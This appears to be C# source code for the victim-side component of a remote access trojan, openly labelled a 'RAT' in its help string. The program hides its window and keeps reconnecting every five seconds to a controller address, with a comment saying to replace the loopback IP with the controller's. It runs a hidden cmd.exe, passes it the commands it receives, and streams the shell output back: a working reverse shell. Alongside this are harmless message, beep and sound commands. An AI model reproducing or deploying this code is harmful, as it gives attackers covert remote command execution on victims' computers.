using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Net.Sockets;// for sockets
using System.IO; //for Streams (network, reader, writer)
using System.Diagnostics; //for Process
using System.Threading; //to run commands concurrently

namespace Server
{
    public partial class Form1 : Form
    {
        TcpClient tcpClient;
        NetworkStream networkStream;
        StreamWriter streamWriter;
        StreamReader streamReader;
        Process processCmd;
        StringBuilder strInput;

        Thread th_message, th_beep, th_playsound;

        const string strHelp = "RAT developed by Kreet Rout.\r\nMalicious use of this tool may lead to legal consequences.";


        //Commands enumerating
        private enum command
        {
            HELP = 1,
            MESSAGE = 2,
            BEEP = 3,
            PLAYSOUND = 4,
            SHUTDOWNSERVER = 5
        }

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Shown(object sender, EventArgs e)
        {
            this.Hide();
            for (; ; )
            {
                RunServer();
                System.Threading.Thread.Sleep(5000); //Try reconnecting every 5 seconds
            }
        }

        private void RunServer()
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            if (!tcpClient.Connected)
            {
                try
                {
                    tcpClient.Connect("127.0.0.1", 9876);   //Replace the loopback address with client IP 
                    networkStream = tcpClient.GetStream();
                    streamReader = new StreamReader(networkStream);
                    streamWriter = new StreamWriter(networkStream);
                }
                catch (Exception err) { return; } 

                processCmd = new Process();
                processCmd.StartInfo.FileName = "cmd.exe";
                //Configuring the cmd.exe usage
                processCmd.StartInfo.CreateNoWindow = true;
                processCmd.StartInfo.UseShellExecute = false;
                processCmd.StartInfo.RedirectStandardOutput = true;
                processCmd.StartInfo.RedirectStandardInput = true;
                processCmd.StartInfo.RedirectStandardError = true;
                processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                processCmd.Start();
                processCmd.BeginOutputReadLine();
            }

            while (true)
            {
                try
                {
                    string line = streamReader.ReadLine();
                    Int16 intCommand = 0;
                    intCommand = GetCommandFromLine(line); //Filter out the command to check if it is for hardware

                    switch ((command)intCommand)
                    {
                        case command.HELP:
                            streamWriter.WriteLine(strHelp);
                            streamWriter.Flush();
                            break;
                        case command.MESSAGE:
                            th_message =new Thread(new ThreadStart(MessageCommand));
                            th_message.Start(); 
                            break;
                        case command.BEEP:
                            th_beep = new Thread(new ThreadStart(BeepCommand));
                            th_beep.Start(); 
                            break;
                        case command.PLAYSOUND:
                            th_playsound = new Thread(new ThreadStart(PlaySoundCommand));
                            th_playsound.Start(); 
                            break;
                        case command.SHUTDOWNSERVER:
                            streamWriter.Flush();
                            Cleanup();
                            System.Environment.Exit(System.Environment.ExitCode);
                            break;
                    }

                    // proceed for execution in server command prompt
                    strInput.Append(line);
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0) StopServer();
                    if (strInput.ToString().LastIndexOf("exit") >= 0) throw new ArgumentException();
                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception err)
                {
                    Cleanup();
                    break;
                }
            }
        }

        private void MessageCommand()
        {
            MessageBox.Show("Hello World");
        }

        private void BeepCommand()
        {
            Console.Beep(500, 2000);
        }

        private void PlaySoundCommand()
        {
            System.Media.SoundPlayer soundPlayer = new System.Media.SoundPlayer();
            soundPlayer.SoundLocation = @"C:\Windows\Media\chimes.wav";
            soundPlayer.Play();
        }

        private void Cleanup()
        {
            try { processCmd.Kill(); } catch (Exception err) { };
            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }
        private void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private Int16 GetCommandFromLine(string strline)
        {
            Int16 intExtractedCommand = 0;
            int i; Char character;
            StringBuilder stringBuilder = new StringBuilder();

            for (i = 0; i < strline.Length; i++)
            {
                character = Convert.ToChar(strline[i]);
                if (Char.IsDigit(character))
                {
                    stringBuilder.Append(character);
                }
            }
            //Convert the stringBuilder string of numbers to integer
            try
            {
                intExtractedCommand =
                Convert.ToInt16(stringBuilder.ToString());
            }
            catch (Exception err) { }
            return intExtractedCommand;
        }

        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
